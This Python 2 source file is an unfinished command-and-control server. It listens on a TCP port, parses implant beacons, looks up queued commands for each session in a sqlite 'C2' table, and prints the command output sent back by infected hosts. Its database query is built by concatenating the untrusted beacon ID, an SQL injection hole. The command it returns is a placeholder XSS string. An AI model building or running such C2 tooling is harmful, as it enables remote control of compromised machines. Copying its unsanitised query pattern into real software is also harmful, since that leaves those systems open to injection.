import SocketServer

#Python listener
#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

class SessionManager():
    def BeaconHandler(self, data):
        #On beacon check for mode (beacon or response)
        #Beacons
        #BEACON FORMAT -> [BID]
        try:
            bid = data.split("0!!!")[1]
            #Check DB for session ID -> if new command -> deliver to target else do nothing
            cmd = " "
            cmd = dbmgr().GetCMD(bid)
            return cmd
        #CMD Responses
        except:
            try:
                print data.split("1!!!")[1]
            #Not Origin traffic
            except:
                pass

        return " "


class dbmgr:
    def __init__(self):
        import sqlite3
        DATABASE = 'odb'
        self.conn = sqlite3.connect(DATABASE, timeout=1)
        self.conn.execute('pragma foreign_keys = on')
        self.conn.commit()
        self.cur = self.conn.cursor()

    def GetCMD(self, bid):
        self.cur.execute("SELECT * FROM C2 WHERE SID = " + bid)
        print self.cur.fetchall()
        cmd = " "
        cmd = "<script>alert('wtf')</script>"
        return cmd

    def getJobs(self):
        #Get jobs from DB
        self.cur.execute("SELECT * FROM Jobs")
        return self.cur.fetchall()



class C2Server(SocketServer.BaseRequestHandler):
    def handle(self):
        #SANITIZE DATA???
        self.data = self.request.recv(1024).strip()
        #print "{} wrote:".format(self.client_address[0])
        print self.data

        response = SessionManager().BeaconHandler(self.data)

        #Respond
        self.request.sendall(response)

if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 4546

    server = SocketServer.TCPServer((HOST, PORT), C2Server)
    server.serve_forever()

"""
#C2 Loop
while 1:
    #Listen for beacons
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    listener.bind((socket.gethostname(), 4545))

    listener.listen(5)


    #On beacon check for mode (beacon or response)
    #Beacons
    if msg.split("0!#")[1]:
        print msg.split("0!#")[1]

    #CMD Responses
    elif msg.split("1!#")[1]:
        print msg.split("1!#")[1]

    #Not Origin traffic
    else:
        pass

    #If beacon check DB for session ID -> if new command -> deliver to target else do nothing


    #If response push to stdout


#Get
"""
